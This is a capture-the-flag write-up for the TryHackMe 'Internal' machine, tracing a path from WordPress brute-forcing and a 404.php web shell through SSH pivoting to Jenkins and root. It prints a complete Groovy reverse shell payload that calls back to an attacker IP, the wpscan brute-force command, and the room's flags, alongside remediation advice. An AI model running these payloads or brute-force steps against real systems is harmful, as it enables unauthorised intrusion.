```markdown
# 🕵️‍♂️ Internal - TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium%2FHard-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-WordPress%20%7C%20Pivoting%20%7C%20Jenkins-blue?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green?style=for-the-badge)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Target:** internal.thm

---

## 📋 Executive Summary

This writeup documents the complete compromise path of the **Internal** machine, progressing from external WordPress exploitation through SSH tunneling/pivoting to internal Jenkins exploitation, ultimately achieving root access. The attack chain demonstrates multiple critical security failures including weak credential policies, plaintext password storage, and misconfigured Jenkins Script Console access.

---

## 🛠️ Tools & Technologies Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service enumeration |
| `gobuster` / `dirb` | Directory enumeration |
| `wpscan` | WordPress vulnerability scanning & brute-force |
| `ssh` / `ssh -L` | Remote access & local port forwarding |
| `netcat` | Reverse shell listener |
| `Jenkins Script Console` | Groovy-based RCE |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

Comprehensive port and service enumeration using nmap:

```bash
nmap -sC -sV -oA nmap/internal.thm internal.thm
```

### Findings

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu | Standard access vector |
| 80 | HTTP | Apache httpd 2.4.29 | WordPress instance detected |

---

## 🌐 Phase 2: Initial Foothold (WordPress Exploitation)

### Web Enumeration

Directory busting revealed a `/blog` endpoint hosting a WordPress installation.

```bash
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
```

### Credential Discovery

WordPress user enumeration and brute-force attack against the `admin` account:

```bash
wpscan --url http://internal.thm/blog \
       --passwords /usr/share/wordlists/rockyou.txt \
       --usernames admin
```

**Result:** Administrative credentials successfully recovered.

### Web Shell Deployment

1. Authenticated to WordPress Admin Dashboard
2. Navigated to **Appearance → Theme Editor → 404.php**
3. Replaced template code with PHP reverse shell payload
4. Triggered shell via non-existent page request
5. Established reverse connection on listener

```bash
nc -lvnp 4444
```

**Initial Access:** `www-data` shell obtained.

---

## 🔄 Phase 3: Lateral Movement (User Pivot)

### Privilege Enumeration

Post-exploitation reconnaissance revealed sensitive credentials stored in plaintext:

```bash
cat /opt/wp-save.txt
```

**Discovery:** SSH credentials for user `aubreanna` exposed in configuration backup file.

### SSH Access & User Flag

```bash
ssh aubreanna@internal.thm
cat /home/aubreanna/user.txt
```

**User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## 🚇 Phase 4: Pivoting & Internal Enumeration

### Local Service Discovery

Internal port scan revealed Jenkins service bound to localhost:

```bash
netstat -tulpn | grep 8080
# 127.0.0.1:8080 - Jenkins CI/CD Server
```

### SSH Local Port Forwarding

Since Jenkins was only accessible internally, established an SSH tunnel for remote access:

```bash
ssh -L 9999:127.0.0.1:8080 aubreanna@internal.thm
```

**Access:** Jenkins Dashboard now available at `http://localhost:9999`

---

## ⚙️ Phase 5: Jenkins Exploitation

### Script Console RCE

Jenkins' Script Console (`/script`) allows execution of arbitrary Groovy code. Leveraged this for remote code execution:

**Groovy Reverse Shell Payload:**
```groovy
String host="10.10.14.2";
int port=4445;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};
p.destroy();s.close();
```

**Result:** Obtained `jenkins` user shell.

---

## 🏁 Phase 6: Privilege Escalation (Root)

### Credential Harvesting

Further enumeration under `/opt` directory revealed critical security failure:

```bash
cat /opt/note.txt
```

**Discovery:** Root password stored in plaintext by user "Will".

### Root Compromise

```bash
su root
# Authenticated with discovered password
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

**Root Flag:** `63a9f0ea7bb98050796b649e85481845`

---

## 🛡️ Vulnerability Analysis & Remediation

| # | Vulnerability | Severity | Remediation |
|---|--------------|----------|-------------|
| 1 | **Weak WordPress Credentials** | 🔴 Critical | Enforce strong password policies; implement MFA; limit login attempts |
| 2 | **Plaintext Password Storage** | 🔴 Critical | Encrypt all credentials; use secrets management (HashiCorp Vault, AWS Secrets Manager) |
| 3 | **Jenkins Script Console Exposure** | 🔴 Critical | Disable Script Console or restrict to admin roles; enable CSRF protection |
| 4 | **Insufficient Network Segmentation** | 🟠 High | Implement VLANs; restrict internal service exposure; use reverse proxies with auth |
| 5 | **Sensitive File Permissions** | 🟠 High | Apply principle of least privilege; regular file permission audits |

---

## 🗺️ Attack Path Visualization

```
[Attacker] ──nmap──► [internal.thm:80] ──wpscan──► [WP Admin]
                                                          │
                                                          ▼
                                              [404.php Shell Upload]
                                                          │
                                                          ▼
                                              [www-data Shell]
                                                          │
                                                          ▼
                                              [/opt/wp-save.txt]
                                                          │
                                                          ▼
                                              [SSH: aubreanna]
                                                          │
                                                          ▼
                                              [SSH Tunnel :9999]
                                                          │
                                                          ▼
                                              [Jenkins:8080]
                                                          │
                                                          ▼
                                              [Groovy RCE]
                                                          │
                                                          ▼
                                              [jenkins User]
                                                          │
                                                          ▼
                                              [/opt/note.txt]
                                                          │
                                                          ▼
                                              [Root Access]
```

---

## 📚 Key Takeaways

1. **Credential Hygiene:** Plaintext passwords remain the #1 attack vector in internal networks
2. **Defense in Depth:** Jenkins should never rely solely on network location for security
3. **Pivoting Techniques:** SSH tunneling is essential for accessing internally-bound services during engagements
4. **WordPress Hardening:** Theme editors and plugin uploads should be restricted/disabled in production

---

## 📁 Repository Structure

```

---

> **⚠️ Disclaimer:** This writeup is for educational purposes only. Always obtain proper authorization before testing systems you do not own.

**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
```
